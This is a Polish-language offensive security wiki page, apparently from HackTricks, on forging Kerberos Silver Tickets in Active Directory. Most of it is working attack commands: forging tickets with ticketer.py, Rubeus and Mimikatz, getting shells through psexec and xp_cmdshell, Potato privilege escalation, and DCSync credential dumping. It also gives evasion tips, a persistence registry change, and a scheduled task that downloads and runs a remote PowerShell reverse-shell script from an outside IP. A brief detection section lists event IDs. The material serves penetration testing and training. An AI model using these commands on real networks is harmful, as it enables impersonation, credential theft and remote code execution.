# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Atak **Silver Ticket** polega na wykorzystaniu service tickets w środowiskach Active Directory (AD). Metoda ta opiera się na **pozyskaniu hasha NTLM konta usługi**, takiego jak konto komputera, w celu sfałszowania biletu Ticket Granting Service (TGS). Za pomocą takiego sfałszowanego biletu atakujący może uzyskać dostęp do określonych usług w sieci, **podszywając się pod dowolnego użytkownika**, zazwyczaj dążąc do uzyskania uprawnień administracyjnych. Podkreśla się, że używanie kluczy AES do fałszowania biletów jest bezpieczniejsze i trudniejsze do wykrycia.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets są trudniejsze do wykrycia niż Golden Tickets, ponieważ wymagają jedynie **hasha konta usługi**, a nie konta krbtgt. Są jednak ograniczone do konkretnej usługi, w którą celują. Co więcej, wystarczy ukraść hasło użytkownika.
Co więcej, jeśli przejmiesz **hasło konta z SPN**, możesz użyć tego hasła do utworzenia Silver Ticket, podszywając się pod dowolnego użytkownika w tej usłudze.

### Współczesne zmiany w Kerberos (domeny obsługujące wyłącznie AES)

- Aktualizacje Windows rozpoczynające się od **8 listopada 2022 r. (KB5021131)** domyślnie ustawiają dla service tickets klucze sesji AES, gdy jest to możliwe, i stopniowo wycofują RC4. Oczekuje się, że do połowy 2026 r. kontrolery domeny będą dostarczane z domyślnie **wyłączonym** RC4, dlatego poleganie na hashach NTLM/RC4 w przypadku silver tickets będzie coraz częściej kończyć się błędem `KRB_AP_ERR_MODIFIED`. Zawsze wyodrębniaj **klucze AES** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) dla docelowego konta usługi.<sup>[[5]](#references)</sup>
- Jeśli dla konta usługi `msDS-SupportedEncryptionTypes` ograniczono szyfrowanie do AES, musisz sfałszować bilet za pomocą `/aes256` lub `-aesKey`; RC4 (`/rc4` lub `-nthash`) nie zadziała, nawet jeśli posiadasz hash NTLM.<sup>[[6]](#references)</sup>
- Konta gMSA/kont komputerów zmieniają klucze co 30 dni; przed sfałszowaniem biletu zrzutuj **bieżący klucz AES** z LSASS, Secretsdump/NTDS lub DCsync.
- OPSEC: domyślny czas ważności biletu w narzędziach często wynosi **10 lat**; ustaw realistyczny czas trwania (np. `-duration 600` minut), aby uniknąć wykrycia z powodu nietypowo długiego okresu ważności.<sup>[[6]](#references)</sup>

Do tworzenia biletów używa się różnych narzędzi, zależnie od systemu operacyjnego:

### Na Linuxie
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### W systemie Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Usługa CIFS jest często wskazywana jako cel umożliwiający dostęp do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, również mogą być wykorzystywane do wykonywania zadań i zapytań WMI.

### Przykład: usługa MSSQL (MSSQLSvc) + Potato do SYSTEM

Jeśli posiadasz hash NTLM (lub klucz AES) konta usługi SQL (np. sqlsvc), możesz sfałszować TGS dla SPN MSSQL i podszyć się pod dowolnego użytkownika w usłudze SQL. Następnie włącz `xp_cmdshell`, aby wykonywać polecenia jako konto usługi SQL. Jeśli ten token ma uprawnienie SeImpersonatePrivilege, połącz Potato, aby uzyskać uprawnienia SYSTEM.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Jeśli uzyskany kontekst ma SeImpersonatePrivilege (często dotyczy to kont usług), użyj wariantu Potato, aby uzyskać uprawnienia SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Więcej informacji na temat nadużywania MSSQL i włączania xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Przegląd technik Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Dostępne usługi

| Typ usługi                                 | Usługi Silver Tickets                                                      |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego również:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach można po prostu poprosić o: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, również psexec         | CIFS                                                                       |
| Operacje LDAP, w tym DCSync                | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Za pomocą **Rubeus** możesz **poprosić o wszystkie** te bilety, używając parametru:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Logowanie konta
- 4634: Wylogowanie konta
- 4672: Logowanie administratora
- **Brak poprzedzających zdarzeń 4768/4769 na DC** dla tego samego klienta/usługi jest częstym wskaźnikiem podrobionego TGS przedstawionego bezpośrednio usłudze.
- Nienormalnie długi czas ważności biletu lub nieoczekiwany typ szyfrowania (RC4, gdy domena wymusza AES) również wyróżniają się w danych 4769/4624.

## Persistence

Aby zapobiec zmianie hasła maszyn co 30 dni, ustaw `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` albo ustaw `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na wartość większą niż 30 dni, aby określić okres rotacji, po którym hasło maszyn powinno zostać zmienione.<sup>[[3]](#references)</sup>

## Abusing Service tickets

W poniższych przykładach załóżmy, że bilet został pobrany podczas impersonacji konta administratora.

### CIFS

Za pomocą tego biletu będzie można uzyskać dostęp do folderów `C$` i `ADMIN$` przez **SMB** (jeśli są udostępnione) oraz kopiować pliki do części zdalnego systemu plików, wykonując po prostu coś takiego:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Będziesz również w stanie uzyskać shell wewnątrz hosta lub wykonywać dowolne komendy przy użyciu **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Dzięki temu uprawnieniu możesz tworzyć zaplanowane zadania na zdalnych komputerach i wykonywać dowolne komendy:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Za pomocą tych ticketów możesz **wykonywać WMI w systemie ofiary**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Znajdź **więcej informacji o wmiexec** na następującej stronie:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Mając dostęp winrm do komputera, możesz **uzyskać do niego dostęp**, a nawet uruchomić PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Sprawdź poniższą stronę, aby poznać **więcej sposobów łączenia się ze zdalnym hostem za pomocą winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Pamiętaj, że **winrm musi być aktywny i nasłuchiwać** na zdalnym komputerze, aby można było uzyskać do niego dostęp.

### LDAP

Mając to uprawnienie, możesz zrzucić bazę danych DC za pomocą **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Dowiedz się więcej o DCSync** na następującej stronie:


{{#ref}}
dcsync.md
{{#endref}}


## Referencje

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Jak zaatakować Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Proces obsługi hasła konta komputera - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: ścieżka Silver Ticket + Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: hardening Kerberos i wycofanie RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Aktualne opcje ticketer.py w Impacket (AES/keytab/czas trwania)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
